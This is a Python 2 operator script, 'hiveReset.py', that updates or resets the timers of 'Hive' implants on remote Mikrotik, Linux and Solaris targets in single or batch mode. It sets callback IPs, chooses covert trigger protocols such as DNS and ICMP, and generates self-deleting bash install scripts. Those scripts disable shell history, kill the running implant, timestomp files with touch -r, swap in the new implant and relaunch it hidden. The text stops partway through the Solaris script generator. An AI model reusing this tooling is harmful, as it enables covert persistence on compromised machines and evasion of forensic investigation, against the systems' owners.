#!/usr/bin/python

'''
package hiveReset.py

USAGE:  hiveReset.py [-b|-s] -f  hiveConfigurationFile 

        -s = single IP processing

        -b = batch processing of multiple IPs

EXAMPLE:

./hiveReset.py -s -f hiveConfigurationFile

./hiveReset.py -b -f hiveConfigurationFile

DEPENDENCIES:
Python with pexpect...
Fully functional cutthroat with hive ILM
'''

import pexpect, sys, os, time, exceptions
from datetime import datetime
import ConfigParser
from optparse import OptionParser

def validProcessingMode(mode):
	'''
	Ensures entered option is either "batch" or "single".
	'''

	badProcessingMode="\n\n FAILURE: The processing mode [%s] entered must be either 'single' or 'batch'.\n\n" % (mode) 
	if	mode == "batch":
		return True
	elif mode == "single":
		return True
	else:
		print badProcessingMode
		return False


def validIP(address):
	'''
	Makes sure the address is of the form A.B.C.D where 
	A,B,C, and D are greater than or equal to 0
	and less than or equal to 255.  Returns True if valid.
	'''

	try:
		parts = address.split(".")
		if len(parts) != 4:
			print "\n\n  Invalid: [%s] is not a valid IPv4 address.\n" % (address)
			return False
		for item in parts:
			if not 0 <= int(item) <= 255:
				print "\n\n  Invalid: [%s] is not a valid IPv4 address.\n" % (address)
				return False
		return True
	except IOError, (errno, strerror):
		print "I/O Error(%s) : %s" % (errno, strerror)
		return False


def validPort(port):
	'''
    Ensures 0 < port < 65536. Returns true if valid.
	'''

	badPortMessage="\n\n  FAILURE:  The port [%s] entered is not a valid port [1-65535].\n\n" % (port)
	if int(port) < 1:
		print badPortMessage
		return False
	elif int(port) > 65535:
		print badPortMessage
		return False
	return True
	

def validProtocol(protocol):
	'''
	Ensures protocol is dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq. Returns true is valid.
	'''

	badProtocolMessage="\n\n  FAILURE: Invalid protocol ["+protocol+"] entered.  It must be one of the following:\n     dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq\n     Bye.\n\n"
	if protocol == "dns-request":
		return True
	elif protocol == "icmp-error":
		return True
	elif protocol == "ping-request":
		return True
	elif protocol == "ping-reply":
		return True
	elif protocol == "raw-tcp":
		return True
	elif protocol == "raw-udp":
		return True
	elif protocol == "tftp-wrq":
		return True
	else:
		print badProtocolMessage
		return False


def validOS(opsys):
	'''
	Ensures operating systems is Linux, Windows, Solaris, or MT for Mikrotik (le, be, ppc, or x86). Returns true if valid.
	'''

	badOSMessage="\n\n  FAILURE: Invalid operating System.  It must be one of the following:\n     Linux, Windows, Solaris Sparc, Solaris x86, Mikrotik MIPS BE, Mikrotik MIPS LE, Mikrotik PPC, or Mikrotik x86.\n     WE SHOULD NEVER GET HERE.... Bye.\n\n"
	if opsys == "Mikrotik MIPS BE": 
		return True
	elif opsys == "Mikrotik MIPS LE":
		return True
	elif opsys == "Mikrotik PPC":
		return True
	elif opsys == "Mikrotik x86": 
		return True
	elif opsys == "Solaris Sparc": 
		return True
	elif opsys == "Solaris x86": 
		return True
	elif opsys == "Linux":
		return True
	elif opsys == "Windows":
		return True
	else:
		print badOSMessage
		return False

def cut_3_interface( cutT, patternA, timeoutValue, referenceContent):
	'''
	Common interface command for three pattern term matching...

	Index 0: Always use the desired matching term for the first value in the pattern.
	Index 1 corresponds to pexpect.EOF
	Index 2 corresponds to pexpect.TIOMEOUT
	'''	

	try:
		index= cutT.expect( patternA )
		if index == 0:
			print referenceContent+": Good match where patternA=<"+patternA+">"
		print cutT.before    #Only used in 3rd log...
	except pexpect.EOF:
		print "FAILED MATCH: Desired match did not occur..."
		print cutT.before
		print cutT.after
	except pexpect.TIMEOUT:
		print "Timeout of %d occurred." % (timeoutValue)
		print cutT.before
		print cutT.after


#====================================================================================================================

class hiveConfigParser(ConfigParser.ConfigParser):
	
	def __init__(self, fileName, mode ):
		'''	
		Initializes the hiveConfigParser class which contains the following
		parameters:

		Local:
			localIP
			localPort
			mode 

		Remote:
			remoteIP
			triggerProtocol
			remotePort
			operatingSystem
			busyboxName
			oldImplant
			installationDirectory
			hiveTimeout
		
		Payload:
			newPayload
			tempPayload
			installation_Script_Name
			operation
				
		Targets:
			list
		'''

		print "hiveConfigParser.__init__:"
		ConfigParser.ConfigParser.__init__(self)
		self.configFileName = fileName
		self.mode = mode
		self.defaultTimeout = 20			# This Effects the timeout delays for Hive's Update and Connect Operations
		self.connectionStatus = False		#Used to determine if the triggered box sucessully calls back.   
		self.logfileName = "None" 			#Used to create one log file for multiple connections...

		#Simplify results listing so you do not have to go through the entire logFile...
		now=datetime.now()
		self.resultsFileName="results_"+now.strftime('%Y%m%d_%H%M%S.')+"log"
		print "\n\nSetting Final Results File to %s\n\n"  % (self.resultsFileName) 
		

	#================================================================
	def setDefaults(self):
		'''
		Sets all values to defaults which must be reset later...	
		'''

		#Remote contains information about the remote box
		self.add_section('Remote')
		#self.set('Remote', 'remoteIP', 'default_remoteIP')									#remoteIP
		#self.set('Remote', 'triggerProtocol', 'default_triggerProtocol')						#triggerProtocol
		#self.set('Remote', 'remotePort', 'default_remotePort')				#remotePort=0 except for raw-tcp and raw-udp triggerProtocol							
		#self.set('Remote', 'operatingSystem', 'default_operatingSystem')						#operatingSystem
		#self.set('Remote', 'busyboxName', 'default_busyboxName')								#bbName
		#self.set('Remote', 'oldImplant', 'default_oldImplant')								#oldImplantName
		#self.set('Remote', 'installationDirectory', '/default_installationDirectory/')		#implantDirectory

		#Local
		self.add_section('Local')
		#self.set('Local', 'localIP', 'default_LocalIP')										#callbackIP
		#self.set('Local', 'localPort', 'default_LocalPort')									#callbackPort
		#self.set('Local', 'mode', 'default_UndefinedMode')									#Either 'batch' or 'single' when set by hive Script.

		#Payloads are files actuall installed on the remote box 
		self.add_section('Payload')
		#self.set('Payload', 'newPayload', 'default_NewPayload')								#newImplantName
		#self.set('Payload', 'tempPayload', 'default_tempPayload')  							#newhive
		#self.set('Payload', 'installation_Script_Name', 'default_installation_Script_Name')  #installationScript
		#self.set('Payload', 'operation', 'default_Operation')
		#self.set('Remote', 'hiveTimeout', 'default_Timeout')
				
		#Targets is a listing of IP addresses that this operation will be directed against.
		self.add_section('Targets')
		#self.set('Targets', 'list', 'default_None')

	#================================================================
	def getLocalMode(self):
		'''
		Returns the local processing Mode.
		'''

		print "\n\n localMode=["+self.get('Local', 'mode', 0)+"]\n\n"
		return self.get('Local', 'mode', 0)
	
	#================================================================
	def setLocalMode(self, mode):
		'''
		Sets the local processing Mode.
		'''

		self.set('Local', 'mode', mode)
		print "\n\n setLocalMode:  mode=["+self.get('Local', 'mode', 0)+"]\n\n"

	
	#================================================================
	def getRemoteIP(self):
		'''
		Returns the remote IP Address.
		'''

		print "\n\n remoteIP=["+self.get('Remote', 'remoteIP', 0)+"]\n\n"
		return self.get('Remote', 'remoteIP', 0)

	
	#================================================================
	def setRemoteIP(self, rIP):
		'''
		Sets the remote IP Address which is used for single Processing.
		'''

		self.set('Remote', 'remoteIP', rIP)
		print "\n\n setRemoteIP:  remoteIP=["+self.get('Remote', 'remoteIP', 0)+"]\n\n"

	
	#================================================================
	def setConfigurationRemoteIP(self):
		'''
		Sets the remoteIP which is used for single Processing.
		'''

		os.system("clear")
		print "\n\n\n Remote IP Address for single processing ...\n"
		print "\n\n\n" 
		if self.mode == "single":
			ipAddress = raw_input('What is the targeted IP address? ')
			if validIP(ipAddress):
				self.setRemoteIP( ipAddress )
			else:
				print "\n\nInvalid IP Address [%s] was not found.\n\n" % (ipAddress)
				sys.exit(-1)
		else:
			print "\n\n Trying to get remoteIP %s while running in %s mode.\n\n" % (self.getRemoteIP(), self.mode)
	
	#================================================================
	def setTargetList(self):
		'''
		Sets the targetList which is used for batch Processing.
		'''

		os.system("clear")
		print "\n\n\n Target List for batch processing ...\n"
		print "\n\n\n" 
		if self.mode == "batch":
			targetFileName = raw_input('What is the name of the file containing only target IP addresses? ')
			if os.path.isfile(targetFileName):
				print "\n\nTarget List [%s] will be used for batch processing.\n\n" % (targetFileName)
			else:
				print "\n\nTarget List [%s] was not found.\n\n" % (targetFileName)
				sys.exit(-1)
		self.set('Targets', 'list', targetFileName)
		print "\n\n setTargetList:  targetList=["+self.get('Targets', 'list', 0)+"]\n\n"

	
	#================================================================
	def getTargetList(self):
		'''
		Returns the targetList which is used for batch Processing.
		'''

		print "\n\n TargetList=["+self.get('Targets', 'list', 0)+"]\n\n"
		return self.get('Targets', 'list', 0)

	#================================================================
	def clearTargetList(self):
		'''
		Clears the targetList to the default_None when not btach processing.
		'''

		print "\n\n TargetList=["+self.get('Targets', 'list', 0)+"]"
		self.set('Targets', 'list', 'default_None')
		print " being cleared to ["+self.get('Targets', 'list', 0)+"]\n"

	#================================================================
	def setBusyBox(self):
		'''
			Sets the busyboxName used for Mikrotik Routers.  All other devices use "N/A".
		'''

		os.system("clear")
		print "\n\n\n Remote Target Box ...\n"
		print "\n\n\n" 
		if self.get('Remote', 'operatingSystem', 0) == "Mikrotik PPC":
			busyboxName = raw_input('What is the full name [pathname included] of the busybox executable stored on the Mikrotik router? ')
			self.set('Remote', 'busyboxName', busyboxName)
		elif self.get('Remote', 'operatingSystem', 0) == "Mikrotik x86":
			busyboxName = raw_input('What is the full name [pathname included] of the busybox executable stored on the Mikrotik router? ')
			self.set('Remote', 'busyboxName', busyboxName)
		elif self.get('Remote', 'operatingSystem', 0) == "Mikrotik MIPS LE":
			busyboxName = raw_input('What is the full name [pathname included] of the busybox executable stored on the Mikrotik router? ')
			self.set('Remote', 'busyboxName', busyboxName)
		elif self.get('Remote', 'operatingSystem', 0) == "Mikrotik MIPS BE":
			busyboxName = raw_input('What is the full name [pathname included] of the busybox executable stored on the Mikrotik router? ')
			self.set('Remote', 'busyboxName', busyboxName)
		else:
			busyboxName="N/A"		
			self.set('Remote', 'busyboxName', busyboxName)

	#================================================================
	def setOperatingSystem(self):
		'''
		Sets the operatingSystem to one of the following:
		Mikrotik MIPS BE
		Mikrotik MIPS LE
		Mikrotik PPC
		Mikrotik x86
		Solaris Sparc
		Solaris x86
		'''

		OSes = [['Mikrotik MIPS BE','mt-mipsbe','linux:mipsbe:mikrotik'],['Mikrotik MIPS LE','mt-mipsle','linux:mipsle:mikrotik'],['Mikrotik PPC','mt-ppc','linux:ppc:mikrotik'],['Mikrotik x86','mt-x86','linux:x86:mikrotik'],['Solaris Sparc','sol-sparc','solaris:sparc'],['Solaris x86','sol-x86','solaris:x86'],['Linux', 'linux-x86', 'linux-386']] 
		OS_Name = '' # Screen name for OS
        	os.system("clear")
		print "\n\n\n Remote Target Box ..."
		print "\n\n\n" 
		while (1):
			print "Enter a number for architecture/OS of the remote Target: " 
			print "1 - Mikrotik MIPS BE" 
			print "2 - Mikrotik MIPS LE" 
			print "3 - Mikrotik PPC" 
			print "4 - Mikrotik x86" 
			print "5 - Solaris Sparc" 
			print "6 - Solaris x86" 
			print "7 - Linux" 
			usr_inp = raw_input( 'Enter your choice (1-7): ' ).strip()
			try:
				if (int(usr_inp) < 1) or (raw_input("Are you sure that the OS is " + OSes[int(usr_inp)-1][0] + "? [y] ") not in ['yes','y','Yes']):
					os.system("clear")
					print "\n\n" 
					print "Try Again" 
					continue
				elif (1 <= int(usr_inp) <= 7):          
					break
				else:
					print "Invalid Option, Try Again" 
					continue
			except:
				os.system("clear")
				print "\n\n" 
				print "Invalid Option, Try Again" 
				continue

		OS_Name = OSes[int(usr_inp) -1][0]
		if validOS(OS_Name):    
			self.set('Remote', 'operatingSystem', OS_Name)		#operatingSystem
		else:
			sys.exit()

	#================================================================
	def setRemotePort(self):
		''' 
		Sets the remotePort to a nonzero value less than 65536 for raw-udp and raw-tcp trigger Protocols.
		For all other protocols, it is set to 0.
		'''

		remotePort = 0
		os.system("clear")
		print "\n\n\n Remote Target Box ..."
		print "\n\n\n" 
		if self.get('Remote', 'triggerProtocol', 0) == "raw-udp":
			remotePort =  raw_input('What remote port [1 - 65535] for raw-udp will you be using? ')
			if not validPort(remotePort):
				sys.exit()
		elif self.get('Remote', 'triggerProtocol', 0) == "raw-tcp":
			remotePort =  raw_input('What remote port [1 - 65535] for raw-tcp will you be using? ')
			if not validPort(remotePort):
				sys.exit()
		else:
			pass
		self.set('Remote', 'remotePort', remotePort)		#remotePort=0 except for raw-tcp and raw-udp triggerProtocol			

	#================================================================
	def getOperation(self):
		'''
		gets the operation as one of the following:

		hiveUpdate
		hiveResetTimer
		'''

		operation = self.get('Payload', 'operation', 0)		#operation
		if operation == "hiveUpdate":
			pass	
		elif operation == "hiveResetTimer":
			pass
		else:
			print "\n\n Invalid hive Operation [%s] defined.\n\n" % (operation)
			sys.exit(-1)

		return operation
	
	#================================================================
	def setOperation(self):
		'''
		Sets the operation to one of the following:

		hiveUpdate
		hiveResetTimer
		'''

		tP = [['hiveUpdate'],['hiveResetTimer']] 
        	os.system("clear")
		print "\n\n\n Remote Target Box ...\n"
		print "\n\n\n" 
		while (1):
			print "Enter a number for the desired operation: " 
			print "1 - hiveUpdate" 
			print "2 - hiveResetTimer"
			usr_inp = raw_input( 'Enter your choice (1-2): ' ).strip()
			try:
				if (int(usr_inp) < 1) or (raw_input("Are you sure that the operation is " + tP[int(usr_inp)-1][0] + "? [y] ") not in ['yes','y','Yes']):
					os.system("clear")
					print "\n\n" 
					print "Try Again" 
					continue
				elif (1 <= int(usr_inp) <= 2):          
					break
				else:
					print "Invalid Option, Try Again" 
					continue
			except:
				os.system("clear")
				print "\n\n" 
				print "Invalid Option, Try Again" 
				continue

		operation = tP[int(usr_inp) -1][0]
		self.set('Payload', 'operation', operation)		#operation

	
	#================================================================
	def logFinalOperationResult(self, result):
		'''
		Displays the final result of each operation for a particular IP Address
		Should only be called at the very end of one hive operation per IP address...	
		'''

		if self.logfileName == "None":
			print "\n\n Should not have gotten here.  The logfileName should have already been set!\n\n"
		else:
			now=datetime.now()
			timeStamp=now.strftime('%m/%d/%Y %H:%M:%S.')
			print "#####"
			print "#####   FINAL RESULT: %s      IP address: %s      operation: %s      configFile: %s      dateTime: %s" % (result, self.getRemoteIP(), self.getOperation(), self.configFileName,timeStamp)
			print "#####"
			resultsFile = open(self.resultsFileName, "a")
			resultsFile.write("#####\n")
			resultsFile.write("#####   FINAL RESULT: " + result + "      IP address: " + self.getRemoteIP() + "      operation: " + self.getOperation() + "      configFile: " + self.configFileName + "      dateTime: " + timeStamp + "\n")
			resultsFile.write("#####\n\n\n")
			resultsFile.close()		
	
	#================================================================
	def setHiveTimeout(self):
		'''
		Sets the initial connection timeout used to connect to the remote Hive Implant to
		allow longer initial connection times.
		'''

		os.system("clear")
		print "\n\n\n Remote Target Box ..."
		print "\n\n\n"
		hiveTimeout =  raw_input('What would you like the initial connection timeout to be set to? ')
		self.set('Remote', 'hiveTimeout', hiveTimeout)	

	#================================================================
	def setConfigurationSettings( self ):
		'''
		Main method to initialize and save a configuration File for Hive.
		After the operator answers a series of questions, the configuration File
		will be saved using the supplied fileName input parameter.
		'''

		#Get input parameters...
		#===============================================================================================
		os.system("clear")
		print "\n\n   No Hive Configuration file [%s] found, so you'll have to answer some questions to create one...\n\n" % (self.configFileName)

		print "\n\n\n Starting to set Configuration Parameters...\n\n\n"
		time.sleep(5)

		self.setDefaults()

		os.system("clear")
		print "\n\n\n Local Box Parameter...\n\n\n"
		callbackIP = raw_input('What is your callback IP address? ')
		if not validIP(callbackIP):
			sys.exit()
		self.set('Local', 'localIP', callbackIP)										#callbackIP

		os.system("clear")
		print "\n\n\n Local Box Parameter...\n\n\n"
		callbackPort = raw_input('What is your callback port? ')
		if not validPort(callbackPort):
			sys.exit()
		self.set('Local', 'localPort', callbackPort)									#callbackPort

		self.setOperation()
		
		if self.getOperation() == "hiveUpdate":
			os.system("clear")
			print "\n\n\n Local Box Parameter...\n\n\n"
			#newImplantName = "hived-linux-i386-PATCHED"
			print "\nThis section refers to the new LOCAL implant for new installation on the target.\n\n"
			newImplantName = raw_input('Name of the new LOCAL hive implant for uploading? ') 
			self.set('Payload', 'newPayload', newImplantName)		#newImplantName

		self.setTriggerProtocol()
		
		self.setRemotePort()

		if self.mode == "single":
			self.setLocalMode( self.mode )
			self.setConfigurationRemoteIP()
		elif self.mode == "batch":
			self.setLocalMode( self.mode )
			self.setTargetList()
		else:
			print "\n\n Illegal mode [%s] defined. \n\n" % (self.mode)
			sys.exit(-1)

		if self.getOperation() == "hiveUpdate":
			self.setOperatingSystem()

			self.setBusyBox()	
		
			os.system("clear")
			print "\n\n\n Remote Target Box ...\n\n\n"
			#oldImplantName = "hived-linux-i386-PATCHED"
			print "\nThe section refers to the old implant's name on the remote box. It will be replaced.\n\n"
			oldImplantName = raw_input('What is the name of the old implant? ')
			self.set('Remote', 'oldImplant', oldImplantName)		#oldImplantName
		
			os.system("clear")
			print "\n\n\n Remote Target Box ...\n\n\n"
			#implantDirectory = "/home/miker/runningHive/"
			implantDirectory = raw_input('What is the full path listing of the directory for installation? ')   
			self.set('Remote', 'installationDirectory', implantDirectory)		#implantDirectory
		
			os.system("clear")
			print "\n\n\n Remote Target Box ...\n\n\n"
			tempPayload="tempPayload"
			print "\nThis section names a temporary File [tempPayload] that will be deleted.\n\n"
			tempPayload = raw_input("What is the temporary payload\'s File name? ")   
			self.set('Payload', 'tempPayload', tempPayload)  		#newhive
		
		
			os.system("clear")
			print "\n\n\n Remote Target Box ...\n\n\n"
			print "\nThis section refers to a self deleting installation file on the remote box.\n\n"
			#installationScript = "install_Linux_script"
			installationScript = raw_input('What name would you like to call the installation script? ') 
			self.set('Payload', 'installation_Script_Name', installationScript)  #installationScript

		self.setHiveTimeout()

		#
		#    Create the hiveResetFile...
		with open( self.configFileName, 'wb') as configfile:
			self.write(configfile)
			configfile.close()

	#================================================================
	def verifyModes( self ): 
		'''  
		Used to verify mode settings.  

		single has a remote_Ip.
		batch  has a target list defined.
		'''

 
		if self.mode == "single":
			if self.getLocalMode() == "single":
				ipSetting = self.getRemoteIP()
			elif self.getLocalMode() == "batch":
				print "\n\n   ERROR: The hiveConfigurationFile mode [batch] does not equal the processing mode [single] that you selected.\n\n"
				sys.exit(-1)
			else:
				print "\n\n hiveConfigurationFile mode [%s] is undefined.\n\n" % (self.getLocalMode())
				sys.exit(-1)
		elif self.mode == "batch":
			if self.getLocalMode() == "batch":
				target = self.getTargetList()
				if os.path.isfile(target):
					print "\n\nTarget List [%s] will be used for batch processing.\n\n" % (target)
				else:
					print "\n\nTarget List [%s] was not found.\n\n" % (target)
					sys.exit(-1)
			elif self.getLocalMode() == "single":
				print "\n\n   ERROR: The hiveConfigurationFile mode [single] does not equal the processing mode [batch] that you selected.\n\n"
				sys.exit(-1)
			else:
				print "\n\n hiveConfigurationFile mode [%s] is undefined.\n\n" % (self.getLocalMode())
				sys.exit(-1)
		else:
			print "\n\n Undefined mode [%s], we have a problem.\n\n" % (self.mode)
			sys.exit(-1)


	#================================================================
	def getTriggerProtocol(self):
		'''
		Returns the triggerProtocol.
		'''
		
		return self.get('Remote', 'triggerProtocol', 0)		#triggerProtocol


	#================================================================
	def setTriggerProtocol(self):
		'''
		Sets the triggerProtocol to one of the following:

		dns-request 
		icmp-error 
		ping-request 
		ping-reply 
		raw-tcp 
		raw-udp 
		tftp-wrq 
		'''
		
		tP = [['dns-request'],['icmp-error'],['ping-request'],['ping-reply'],['raw-tcp'],['raw-udp'],['tftp-wrq']] 
        	os.system("clear")
		print "\n\n\n Remote Target Box ...\n"
		print "\n\n\n" 
		while (1):
			print "Enter a number for the desired trigger Protocol: " 
			print "1 - dns-request" 
			print "2 - icmp-error" 
			print "3 - ping-request" 
			print "4 - ping-reply" 
			print "5 - raw-tcp" 
			print "6 - raw-udp" 
			print "7 - tftp-wrq" 
			usr_inp = raw_input( 'Enter your choice (1-7): ' ).strip()
			try:
				if (int(usr_inp) < 1) or (raw_input("Are you sure that the trigger Protocol is " + tP[int(usr_inp)-1][0] + "? [y] ") not in ['yes','y','Yes']):
					os.system("clear")
					print "\n\n" 
					print "Try Again" 
					continue
				elif (1 <= int(usr_inp) <= 7):          
					break
				else:
					print "Invalid Option, Try Again" 
					continue
			except:
				os.system("clear")
				print "\n\n" 
				print "Invalid Option, Try Again" 
				continue

		triggerProtocol = tP[int(usr_inp) -1][0]
		if validProtocol(triggerProtocol):    
			self.set('Remote', 'triggerProtocol', triggerProtocol)		#triggerProtocol
		else:
			sys.exit()

	#================================================================
	def make_Linux_hiveUpdateInstallationScript(self):
		'''
		Makes the installation script fo hive implants running on Linux boxes.  

		The installation script attempts to save history as is on the box before the installation script is run.
		The installation script will be removed once installed and executed on the remote targetted Linux box.
		'''

		#===================================
		#        Linux Installation script
		#===================================
		installationFile = open( self.get('Payload', 'installation_Script_Name', 0) , "w")
		installationFile.write('#!/bin/bash\n\n\n')
		installationFile.write("fileToDelete=$0\n\n")
		
		installationFile.write('#Remove history temporarily...\n')
		installationFile.write("OLDHISTFILE=$HISTFILE\n")
		installationFile.write("unset HISTFILE\n")
		installationFile.write("export HISTFILE\n")
		installationFile.write("OLDHISTSIZE=$HISTSIZE\n")
		installationFile.write("HISTSIZE=0\n")
		installationFile.write("export HISTSIZE\n")
		installationFile.write('\n')

		installationFile.write('#Most logic required to replace and restart implant...\n')
		installationFile.write('\n')

		#installationFile.write("kill -9 `ps -ef | grep [h]ived-linux-i386-PATCHED | grep -v grep | awk '\{print \$2\}\' \` 2>/dev/null \n")
		installationFile.write("kill -9 `ps -ef | grep ")
		installationFile.write( self.get('Remote', 'oldImplant', 0) )
		installationFile.write(" | grep -v grep | awk \'{ ")
		installationFile.write("print $2 }\' ` ")
		installationFile.write('2>/dev/null')
		installationFile.write("\n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write("#  Saved time information   \n")
		installationFile.write('touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write('\n')
		installationFile.write('sleep 2\n')
		installationFile.write('\n')

		#installationFile.write('rm -f ./hived-linux-i386-PATCHED 2>/dev/null\n')
		installationFile.write("rm -f ")
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0))
		installationFile.write(" 2>/dev/null \n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		#installationFile.write('cp -f ./newhive ./hived-linux-i386-PATCHED 2>/dev/null\n')
		installationFile.write('cp -f ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write( self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" 2>/dev/null \n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write("#  Transferred time information back \n")
		installationFile.write('touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(' 2>/dev/null\n')
		installationFile.write('sleep 2\n')
		installationFile.write('\n')

		#installationFile.write('/usr/bin/nohup /home/miker/runningHive/hived-linux-i386-PATCHED & \n')
		#installationFile.write('/usr/bin/nohup ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" &>/dev/null \n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write('#Remove tempPayload file if it exists\n')
		#installationFile.write('rm -f /home/miker/runningHive/newhive 2>/dev/null\n')
		installationFile.write('rm -f ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0))
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write(" 2>/dev/null\n")
		installationFile.write('\n')

		installationFile.write("#Reset History.\n")
		installationFile.write("HISTSIZE=$OLDHISTSIZE\n")
		installationFile.write("export HISTSIZE\n")
		installationFile.write("set HISTFILE $OLDHISTFILE\n")
		installationFile.write("export HISTFILE\n")
		installationFile.write('\n')

		installationFile.write('#Remove the installation script...\n')
		installationFile.write('rm -f $fileToDelete 2>/dev/null\n')
		installationFile.close()

	#================================================================
	def make_MT_hiveUpdateInstallationScript(self):
		'''
		Makes the installation script fo hive implants running on Mikrotik boxes.  

		The installation script will be removed once installed and executed on the remote targetted Mikrotik box.
		'''

		#===================================
		#        Mikrotik Installation script
		#===================================
		installationFile = open(self.get('Payload', 'installation_Script_Name',0), "w")
		installationFile.write('#!/bin/bash\n\n\n')

		installationFile.write('fileToDelete=$0\n')
		installationFile.write('\n')

		installationFile.write('#Most logic required to replace and restart implant...\n')
		installationFile.write('\n')

		#/rw/pckg/busybox killall hived-mikrotik-mipsbe-PATCHED
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(" killall ")
		installationFile.write(self.get('Remote', 'oldImplant', 0))
		installationFile.write('\n')
		installationFile.write('\n')

		#/rw/pckg/busybox sleep 5
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(" sleep 5\n")
		installationFile.write('\n')

		installationFile.write("#   Save the time information.\n")
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(" touch -r ")
                installationFile.write( self.get('Remote', 'installationDirectory', 0) )
                installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
                installationFile.write(' ')
                installationFile.write( self.get('Remote', 'installationDirectory', 0) )
                installationFile.write(self.get('Remote', 'oldImplant', 0) )
                installationFile.write(' 2>/dev/null\n')
                installationFile.write(' \n')

                #/rw/pckg/busybox sleep 2
                installationFile.write(self.get('Remote', 'busyboxName', 0))
                installationFile.write(" sleep 2\n")
                installationFile.write('\n')

		#mv newhive hived-mikrotik-mipsbe-PATCHED
		#installationFile.write("mv ")
		#installationFile.write(self.get('Payload', 'tempPayload', 0))
		#installationFile.write(" ")
		#installationFile.write(self.get('Remote', 'oldImplant', 0))
		#installationFile.write("\n")

		installationFile.write('cp -f ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write( self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" 2>/dev/null \n")
		installationFile.write('\n')

		#/rw/pckg/busybox sleep 5
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(" sleep 5\n")
		installationFile.write('\n')

		installationFile.write("#  Transferred time information back \n")
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(' touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(" 2>/dev/null \n")
		installationFile.write('\n')

                #/rw/pckg/busybox sleep 5
                installationFile.write(self.get('Remote', 'busyboxName', 0))
                installationFile.write(" sleep 5\n")
                installationFile.write('\n')

		#/rw/pckg/hived-mikrotik-mipsbe-PATCHED &
		installationFile.write(self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(' & \n')
		installationFile.write('\n')

		installationFile.write('#Remove tempPayload file if it exists\n')
		#rm -f /rw/pckg/newhive 2>/dev/null 
		installationFile.write(' rm -f ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0))
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write(' 2>/dev/null \n') 
		installationFile.write('\n')

		installationFile.write('#Remove this installation script\n')
		#rm -f $fileToDelete 2>/dev/null
		installationFile.write('rm -f $fileToDelete 2>/dev/null \n')
		installationFile.write('\n')

		installationFile.close()

	#================================================================
	def make_Solaris_hiveUpdateInstallationScript(self):
		'''
		Makes the installation script fo hive implants running on Solaris boxes.  

		The installation script attempts to save history as is on the box before the installation script is run.
		The installation script will be removed once installed and executed on the remote targetted Solaris box.
		'''

		#===================================
		#        Solaris Installation script
		#===================================
		installationFile = open(self.get('Payload', 'installation_Script_Name',0), "w")
		installationFile.write('#!/bin/bash\n\n\n')
	
		installationFile.write('fileToDelete=$0\n')
		installationFile.write('\n')
		
		installationFile.write('#Remove history temporarily...\n')
		installationFile.write("OLDHISTFILE=$HISTFILE\n")
		installationFile.write("unset HISTFILE\n")
		installationFile.write("export HISTFILE\n")
		installationFile.write("OLDHISTSIZE=$HISTSIZE\n")
		installationFile.write("HISTSIZE=0\n")
		installationFile.write("export HISTSIZE\n")
		installationFile.write('\n')

		installationFile.write('#Most logic required to replace and restart implant...\n')
		installationFile.write('\n')

		#kill -9 `ps -ef | grep /export/home/[h]ived-solaris-sparc-PATCHED | grep -v grep | awk '{print $2}' ` 2>/dev/null
		installationFile.write("kill -9 `ps -ef | grep ")
		installationFile.write(self.get('Remote', 'oldImplant', 0))
		installationFile.write(" | grep -v grep | awk \'{ ")
		installationFile.write("print $2 }\' ` ")
		installationFile.write('2>/dev/null')
		installationFile.write("\n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write("#  Saved time information   \n")
		installationFile.write('touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write('\n')
		installationFile.write('sleep 2\n')
		installationFile.write('\n')

		#Copies newhive back into the oldImplant
		#installationFile.write('cp -f ./newhive ./hived-linux-i386-PATCHED 2>/dev/null\n')
		installationFile.write("cp -f ./")
